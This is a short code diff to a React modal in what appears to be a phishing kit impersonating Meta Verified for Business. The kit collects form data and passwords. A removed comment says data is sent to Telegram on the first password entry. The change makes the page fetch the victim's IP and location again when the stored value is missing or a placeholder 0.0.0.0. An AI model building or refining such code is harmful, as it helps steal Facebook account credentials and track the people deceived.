@@ -7,7 +7,7 @@ import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice'
 import { useAppStrings } from '@/hooks/useAppStrings';
 import ActivationRefChip from '@/components/meta-verified-for-business/ActivationRefChip';
 import FacebookNotifyToggle from '@/components/meta-verified-for-business/FacebookNotifyToggle';
-import { getUserLocation } from '@/utils/getLocation';
+import { getUserLocation, isUnresolvedLocation } from '@/utils/getLocation';
 
 interface InfomationsModalProps {
   isOpend: boolean;
@@ -80,8 +80,8 @@ const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPas
 
       dispatch(updateForm(clientData));
 
-      // Chỉ bổ sung IP/location nếu thiếu; gửi Telegram khi nhập mật khẩu lần 1
-      if (!clientData.ip?.trim() || !clientData.location?.trim()) {
+      // Chỉ bổ sung IP/location nếu thiếu hoặc đang là giá trị giả 0.0.0.0
+      if (isUnresolvedLocation(clientData)) {
         const location = await getUserLocation();
         dispatch(updateForm(location));
       }
